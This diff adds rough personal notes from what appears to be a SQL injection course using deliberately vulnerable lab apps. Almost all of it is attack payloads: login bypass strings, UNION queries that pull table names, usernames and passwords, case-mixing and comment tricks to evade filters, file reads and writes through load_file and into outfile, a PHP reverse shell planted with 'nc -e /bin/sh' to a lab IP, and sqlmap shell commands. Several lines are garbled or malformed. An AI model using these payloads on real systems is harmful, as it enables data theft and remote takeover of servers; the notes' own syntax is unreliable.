@@ -1,0 +1,179 @@
+#in terminal
+mysql -u root -h 10.20.14.204
+show databases;
+use owasp 10;
+show tables;
+select * from accounts;
+
+name: zaid
+passwd: 123456' and 1=1#
+
+name admin
+pswd aaa' or 1=1#
+
+usernameadmin
+passwd 1
+
+#intercept with burp modify paswd in burp
+
+index.php? page=user-info.php &username=zaid&pasword=123456&user-info-php-submit-button=view+Account+details
+index.php? page=user-info.php &username=zaid'orderby1#&pasword=123456&user-info-php-submit-button=view+Account+details
+
+#check http encoder
+
+#reading database information
+union select 1,2,3,4,5 <= replace union select with these
+union select 1,database(),user(),version(),5
+
+#finding database tables
+union select 1,table_name,null,null,5 from information schema.tables
+
+union select 1,table_name,null,null,5 from information schema.tables where table_schema = 'owasp10'
+
+#extracting sensitive data eg passwords
+union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'
+union select 1,username,password,is_admin,5 from accounts
+
+#advanced sql
+
+1
+1' and 1=1%23
+1' order by 1
+
+1' and 1=1%23
+1' union select user,password from users%23
+1 and 1=1%23
+
+#in the decoder part of burpsuite you can use it to convert anything to url format for injection
+#anything in hex format starts with 0x
+
+#bypassing filters
+and 1=1
+aNd 222=222
+anD 111 = 111
+orDeR bY1
+
+union select 1,2 %23
+uNion + sEleCt +1,2 +%23
+uNioN/**/sElect/**/1,2/**/%23
+
+#bypassing security and accessing all records
+1' + uNioN/**/sElect/**/table_name,2+fRom+information_schema.tables%23&Submit=Submit#
+
+#in metasploit
+sudo nano /var/www/dvwa/vulnerabilities/sqli
+sudo nano /var/www/dvwa/vulnerabilities/sqli/source/low.php
+
+comment out the while loop
+ctrlx
+y
+enter
+
+1' + uNioN/**/sElect/**/table_name,2+fRom+information_schema.tables+where+table_schema='dvwa'+limit+1,1%23&submit=Submit#
+
+
+#using sqli to read files from the server
+union select null,load_file(;/etc/passwords'),null,null%23
+
+union select null,'example example',null,null,null into outfile 'var/www/mutillidae/example.txt'
+
+#reverse shell in sqli
+1' union select 1,2%23
+union select'<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>;null into outfile'/tmp/reverse.php>
+
+#in terminal
+nc -vv -l -p 8080
+
+#sql map
+sqlmap -u "target url"
+sqlmap --help
+sqlmap -u "target url" --dbs
+
+#getting a direct sql shell using sqlmap
+sqlmap -u "target url" --os -shell
+sqlmap-u "target url"--sql-shell
+select table_name from information_schema.tables where table_schema='owasp10'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
